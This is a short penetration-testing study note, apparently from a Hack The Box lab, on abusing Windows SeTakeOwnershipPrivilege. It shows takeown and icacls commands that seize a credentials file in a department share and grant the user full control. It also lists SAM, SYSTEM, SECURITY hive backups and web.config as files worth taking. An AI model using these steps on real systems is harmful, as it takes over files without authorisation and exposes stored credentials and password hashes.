

It grants me the ability to take ownership of a securable object. meaning AD objects, NFTS files/folders, Registry keys, services & even processes. This priv assigns  [WRITE_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object, meaning the user can change the owner within the object's security descriptor. It may also be assigned a few others such as `SeBackupPrivilege`, `SeRestorePrivilege`, and `SeSecurityPrivilege` to control this account's privileges at a more granular level and not granting the account full local admin rights

[[3 SeTakeOwnership]]

## TDLR;




```powershell
// --------------------- SeTakeOwnerShip  --------------------- //

// Checking ownership before doing anything
cmd /c dir /q 'C:\Department Shares\Private\IT'

// Using take ownership
takeown /f 'C:\Department Shares\Private\IT\cred.txt'

// Checking the ACLs to see if we are actually owner
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

// using take owner we grant ourselves full access
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

// List of potentially important files
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

